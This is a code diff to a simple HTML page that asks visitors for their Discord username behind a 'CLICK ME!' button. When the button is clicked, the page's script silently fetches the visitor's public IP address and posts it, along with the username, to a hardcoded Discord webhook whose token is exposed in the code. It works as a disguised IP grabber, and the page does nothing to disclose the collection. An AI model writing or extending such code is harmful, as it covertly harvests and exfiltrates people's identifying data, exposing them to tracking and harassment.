@@ -11,7 +11,24 @@
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: black;
+            background-color: #121212;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            text-align: center;
+            background-color: #1e1e1e;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        input[type="text"] {
+            padding: 10px;
+            font-size: 18px;
+            margin-bottom: 20px;
+            border: none;
+            border-radius: 5px;
+            width: calc(100% - 22px);
         }
         #clickMeBtn {
             padding: 20px 40px;
@@ -22,25 +39,48 @@
             border-radius: 5px;
             cursor: pointer;
         }
-        #clickMeBtn:hover {
+        #clickMeBtn:disabled {
+            background-color: grey;
+            cursor: not-allowed;
+        }
+        #clickMeBtn:hover:enabled {
             background-color: darkgreen;
         }
     </style>
 </head>
 <body>
-    <button id="clickMeBtn">CLICK ME!</button>
+    <div class="container">
+        <h1>Welcome!</h1>
+        <p>Please enter your Discord username to proceed:</p>
+        <input type="text" id="discordUsername" placeholder="Discord Username">
+        <br>
+        <button id="clickMeBtn" disabled>CLICK ME!</button>
+    </div>
 
     <script>
-        document.getElementById('clickMeBtn').addEventListener('click', function() {
+        const discordUsernameInput = document.getElementById('discordUsername');
+        const clickMeBtn = document.getElementById('clickMeBtn');
+
+        discordUsernameInput.addEventListener('input', function() {
+            clickMeBtn.disabled = !discordUsernameInput.value.trim();
+        });
+
+        clickMeBtn.addEventListener('click', function() {
+            const discordUsername = discordUsernameInput.value.trim();
+            if (!discordUsername) {
+                alert('Please enter your Discord username.');
+                return;
+            }
+
             // Get the IP address using ipify
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     const ip = data.ip;
-                    // Send the IP address to the Discord webhook
+                    // Send the IP address and Discord username to the Discord webhook
                     const webhookUrl = 'https://discord.com/api/webhooks/1236739657505439854/xrWrzCfXnGaQ_TcMO7xXVMUw5LZU6k_fRuEIplzFBaGTB9R7hc4YJC579feuU1UqRNWx';
                     const message = {
-                        content: `User IP: ${ip}`
+                        content: `(${ip}) - [${discordUsername}]`
                     };
                     
                     fetch(webhookUrl, {
@@ -61,3 +101,4 @@
     </script>
 </body>
 </html>
+
